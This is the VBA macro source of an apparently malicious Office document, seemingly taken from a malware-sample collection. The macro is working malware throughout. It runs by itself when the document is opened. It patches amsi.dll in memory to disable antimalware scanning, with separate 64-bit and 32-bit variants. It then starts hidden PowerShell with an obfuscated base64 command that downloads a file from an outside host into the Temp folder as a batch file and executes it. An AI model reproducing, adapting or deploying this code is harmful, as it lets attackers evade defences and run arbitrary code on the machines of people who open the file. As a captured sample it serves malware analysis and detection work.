Attribute VB_Name = "NewMacros"
Private Declare PtrSafe Function GetProcAddress Lib "kernel32" (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr
Private Declare PtrSafe Function LoadLibrary Lib "kernel32" Alias "LoadLibraryA" (ByVal lpLibFileName As String) As LongPtr
Private Declare PtrSafe Function VirtualProtect Lib "kernel32" (lpAddress As Any, ByVal dwSize As LongPtr, ByVal flNewProtect As Long, lpflOldProtect As Long) As Long
 
Private Declare PtrSafe Sub ByteSwapper Lib "kernel32.dll" Alias "RtlFillMemory" (Destination As Any, ByVal Length As Long, ByVal Fill As Byte)
 
Declare PtrSafe Sub Peek Lib "msvcrt" Alias "memcpy" (ByRef pDest As Any, ByRef pSource As Any, ByVal nBytes As Long)
 
Private Declare PtrSafe Function CreateProcess Lib "kernel32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDriectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
Private Declare PtrSafe Function OpenProcess Lib "kernel32.dll" (ByVal dwAccess As Long, ByVal fInherit As Integer, ByVal hObject As Long) As Long
Private Declare PtrSafe Function TerminateProcess Lib "kernel32" (ByVal hProcess As Long, ByVal uExitCode As Long) As Long
Private Declare PtrSafe Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
 
Private Type PROCESS_INFORMATION
    hProcess As Long
    hThread As Long
    dwProcessId As Long
    dwThreadId As Long
End Type
 
Private Type STARTUPINFO
    cb As Long
    lpReserved As String
    lpDesktop As String
    lpTitle As String
    dwX As Long
    dwY As Long
    dwXSize As Long
    dwYSize As Long
    dwXCountChars As Long
    dwYCountChars As Long
    dwFillAttribute As Long
    dwFlags As Long
    wShowWindow As Integer
    cbReserved2 As Integer
    lpReserved2 As Long
    hStdInput As Long
    hStdOutput As Long
    hStdError As Long
End Type
 
Const CREATE_NO_WINDOW = &H8000000
Const CREATE_NEW_CONSOLE = &H10
 
Function LoadDll(dll As String, func As String) As LongPtr
 
Dim AmsiDLL As LongPtr
 
AmsiDLL = LoadLibrary(dll)
LoadDll = GetProcAddress(AmsiDLL, func)
 
End Function
 
Function GetTri(LeakedBoltDll As LongPtr, LeakedBoltTraverse As Integer) As String
 
Dim LeakedPipe As String
Dim LeakedBolt As LongPtr
Dim LeakedBolt2 As LongPtr
 
On Error Resume Next
 
LeakedBolt2 = LeakedBoltDll - LeakedBoltTraverse
 
Dim i As Integer
For i = 0 To LeakedBoltTraverse
    Peek LeakedBolt, ByVal (LeakedBolt2 + i), 1
 
    If LeakedBolt < 16 Then
        FixedByteString = "0" & Hex(LeakedBolt)
        LeakedPipe = LeakedPipe & FixedByteString
    Else
        LeakedPipe = LeakedPipe & Hex(LeakedBolt)
    End If
Next i
 
GetTri = LeakedPipe
 
End Function
 
Function gregs100(LeakedBoltDll As LongPtr, LeakedBoltTraverse As Integer, InstructionInStringOffset As Integer) As LongPtr
 
Dim memOffset As Integer
 
memOffset = (InstructionInStringOffset - 1) / 2
gregs100 = (LeakedBoltDll - LeakedBoltTraverse) + memOffset
 
End Function
 
Sub x64_off()
 
Dim LeakedBoltDll As LongPtr
 
Dim SBMB As String
Dim SSMB As String
Dim LeakedPipe As String
Dim ASBPA As LongPtr
Dim Gregs1 As LongPtr
Dim Gregs2 As Integer
 
Dim InstructionInStringOffset As Integer
Dim Success As Integer
 
SBMB = "4C8BDC49895B08"
SSMB = "4883EC384533DB"
Gregs2 = 352
Success = 0
 
LeakedBoltDll = LoadDll("amsi.dll", "AmsiUacInitialize")
 
LeakedPipe = GetTri(LeakedBoltDll, Gregs2)
 
InstructionInStringOffset = InStr(LeakedPipe, SBMB)
If InstructionInStringOffset = 0 Then
    ' MsgBox "We didn't find the scanbuffer magicbytes :/"
Else
    ASBPA = gregs100(LeakedBoltDll, Gregs2, InstructionInStringOffset)
 
    Result = VirtualProtect(ByVal ASBPA, 32, 64, 0)
    ByteSwapper ByVal (ASBPA + 0), 1, Val("&H" & "90")
    ByteSwapper ByVal (ASBPA + 1), 1, Val("&H" & "C3")
    Success = Success + 1
End If
 
 
InstructionInStringOffset = InStr(LeakedPipe, SSMB)
If InstructionInStringOffset = 0 Then
    ' MsgBox "We didn't find the scanstring magicbytes :/"
Else
    Gregs1 = gregs100(LeakedBoltDll, Gregs2, InstructionInStringOffset)
 
    Result = VirtualProtect(ByVal Gregs1, 32, 64, 0)
    ByteSwapper ByVal (Gregs1 + 0), 1, Val("&H" & "90")
    ByteSwapper ByVal (Gregs1 + 1), 1, Val("&H" & "C3")
    Success = Success + 1
End If
 
If Success = 2 Then
    Call CallHome
End If
 
End Sub
 
Sub x32_off()
 
Dim LeakedBoltDll As LongPtr
 
Dim SBMB As String
Dim SSMB As String
Dim LeakedPipe As String
Dim ASBPA As LongPtr
Dim Gregs1 As LongPtr
Dim Gregs2 As Integer
 
Dim InstructionInStringOffset As Integer
Dim Success As Integer
 
SBMB = "8B450C85" & "C0745A85DB"
SSMB = "8B550C85D" & "27434837D"
Gregs2 = 300
Success = 0
 
LeakedBoltDll = LoadDll("amsi.dll", "AmsiUacInitialize")
 
LeakedPipe = GetTri(LeakedBoltDll, Gregs2)
 
InstructionInStringOffset = InStr(LeakedPipe, SBMB)
If InstructionInStringOffset = 0 Then
    ' MsgBox "We didn't find the scanbuffer magicbytes :/"
Else
    ASBPA = gregs100(LeakedBoltDll, Gregs2, InstructionInStringOffset)
 
    Debug.Print Hex(ASBPA)
 
    Result = VirtualProtect(ByVal ASBPA, 32, 64, 0)
    ByteSwapper ByVal (ASBPA + 0), 1, Val("&H" & "90")
    ByteSwapper ByVal (ASBPA + 1), 1, Val("&H" & "31")
    ByteSwapper ByVal (ASBPA + 2), 1, Val("&H" & "C0")
    Success = Success + 1
End If
 
InstructionInStringOffset = InStr(LeakedPipe, SSMB)
If InstructionInStringOffset = 0 Then
    ' MsgBox "We didn't find the scanstring magicbytes :/"
Else
    Gregs1 = gregs100(LeakedBoltDll, Gregs2, InstructionInStringOffset)
 
    Debug.Print Hex(Gregs1)
 
    Result = VirtualProtect(ByVal Gregs1, 32, 64, 0)
    ByteSwapper ByVal (Gregs1 + 0), 1, Val("&H" & "90")
    ByteSwapper ByVal (Gregs1 + 1), 1, Val("&H" & "31")
    ByteSwapper ByVal (Gregs1 + 2), 1, Val("&H" & "D2")
    Success = Success + 1
End If
 
If Success = 2 Then
    Call CallHome
End If
 
End Sub
 
Sub TestOfficeVersion()
 
#If Win64 Then
    Call x64_off
#ElseIf Win32 Then
    Call x32_off
#End If
 
End Sub
 
Sub CallHome()
     
Dim pInfo As PROCESS_INFORMATION
Dim sInfo As STARTUPINFO
Dim sNull As String
Dim lSuccess As Long
Dim lRetValue As Long
Dim tttt As String
Dim rrr As String
rrr = "wers"
tttt = "po" & rrr & "hell -WindowStyle Hidden -command ""$thing = 'JGZpbGVsb2NhdGUgPSAkZW52OkxPQ0FMQVBQREFUQSArICdcVGVtcFx0dHQuYmF0JzsgZnVuY3Rpb';$glue = '24gdG9tMSAoICR2YXIxLCAkdmFyMiApIHsgSW1wb3J0LU1vZHVsZSBCaXRzVHJhbnNmZXI7U3RhcnQtQml0c1RyYW5zZmVyIC1Tb3VyY2UgJHZhcjEgLURlc3RpbmF0aW9uICR2YXIyOyhOZXctT2Jq';$panda = 'ZWN0IC1jb20gU2hlbGwuQXBwbGljYXRpb24pLlNoZWxsRXhlY3V0ZSgkdmFyMik7IH10b20xICdod';$cat = 'HRwOi8vd3d3LmN5YmVybGVnYWwuY28udWsvZmlsZS9KYW1lc1R1Y2tlci5wZGYnICRmaWxlbG9j';$test = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($thing + $glue + $panda + $cat + 'YXRlIAoK'));Invoke-Expression -command $test;"""
lSuccess = CreateProcess(sNull, tttt, ByVal 0&, ByVal 0&, 1&, CREATE_NEW_CONSOLE, ByVal 0&, sNull, sInfo, pInfo)
 
lRetValue = CloseHandle(pInfo.hThread)
lRetValue = CloseHandle(pInfo.hProcess)

Selection.GoTo What:=wdGoToPage, Which:=wdGoToRelative, Count:=9
 
End Sub

Sub AutoOpen()
     TestOfficeVersion
End Sub
Sub Workbook_Open()
     TestOfficeVersion
End Sub



Attribute VB_Name = "ThisDocument"
Attribute VB_Base = "1Normal.ThisDocument"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = True
Attribute VB_Customizable = True
Attribute VB_Name = "UserForm1"
Attribute VB_Base = "0{86966E69-6747-4FC4-9BAB-59F11BFDAFD2}{3515FF6A-B16A-4810-A669-941BCE96C85A}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
Private Sub Frame1_Click()

End Sub

Private Sub Label1_Click()

End Sub


INQUEST-PP=macro
